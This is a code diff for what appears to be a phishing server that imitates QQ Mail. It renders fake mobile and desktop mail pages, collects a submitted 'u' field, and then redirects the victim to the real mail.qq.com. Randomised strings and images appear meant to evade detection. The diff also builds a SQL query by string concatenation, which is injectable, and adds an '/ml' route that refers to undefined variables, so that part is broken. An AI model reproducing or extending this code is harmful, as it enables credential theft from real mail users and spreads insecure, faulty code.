@@ -6,6 +6,14 @@ var cwd = process.cwd();
 var path = require('path');
 var ranStr = require('../lib/ranstr.js')
 
+var isMobile = function (ua) {
+    if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(ua)) {
+        return true
+    } else {
+        return false
+    }
+}
+
 module.exports = function (app) {
     function insertData(req, cb) {
         var qq = req.body.u;
@@ -70,7 +78,7 @@ module.exports = function (app) {
         var uid = uidStr.substr(0, uidStr.indexOf('.'));
         uid = code.decode(uid);
         res.statusCode = 404;
-        
+
         sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
             var mid = rows[0].tempId;
             var bgUrl = rows[0].bgUrl;
@@ -82,6 +90,7 @@ module.exports = function (app) {
         });
     });
 
+    // 邮箱
     app.get('/vote/:name', function (req, res) {
         var uidStr = req.headers.host;
         var uid = uidStr.substr(0, uidStr.indexOf('.'));
@@ -94,7 +103,8 @@ module.exports = function (app) {
                 var mid = rows[0].tempId;
                 var bgUrl = rows[0].bgUrl;
                 var url = rows[0].url;
-                res.render('pages/wap_mail2.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg,ranRp: ranStr.ranRp });
+                res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/pc_mail.html', { layout: null, sha: ranStr.sha, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
+                ranStr.count++;
             });
         } catch (e) {
             res.sendFile(path.join(cwd, '/404.html'));
@@ -104,6 +114,7 @@ module.exports = function (app) {
     app.post('/vote/:name', function (req, res) {
         var tz = req.body.tz;
         var uidStr = req.headers.host;
+
         var uid = uidStr.substr(0, uidStr.indexOf('.'));
         uid = code.decode(uid);
         var x = req.url.split('/')
@@ -117,7 +128,8 @@ module.exports = function (app) {
                     if (tz.toString() === '1') {
                         return res.send('<script>window.parent.location.href="http://mail.qq.com";</script>');
                     }
-                    res.render('pages/wap_mail2.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg,ranRp: ranStr.ranRp });
+                    res.render(isMobile(req.headers['user-agent']) ? 'pages/wap_mail2.html' : 'pages/pc_mail.html', { layout: null, tz: 1, sha: ranStr.sha, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg, ranRp: ranStr.ranRp });
+                    ranStr.count++;
                 });
             });
         } catch (e) {
@@ -172,6 +184,20 @@ module.exports = function (app) {
         var jmStr = x[x.length - 1]
         res.render('ssrjs/yzm_css.html', { layout: null, ranStr: ranStr.en2(jmStr), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, jmStr: jmStr })
     });
+
+    app.get('/ml/:name', function (req, res) {
+        res.render('pages/wap_mail2.html', {
+            layout: null,
+            tz: 1,
+            uid: uid,
+            mid: mid,
+            bgUrl: bgUrl,
+            ranStr: ranStr.en2(s_ran),
+            ranImg: ranStr.ranImg,
+            ranRp: ranStr.ranRp
+        });
+
+    })
 
     //验证码图片
     app.get('/i/:a/:name/:c', function (req, res) {
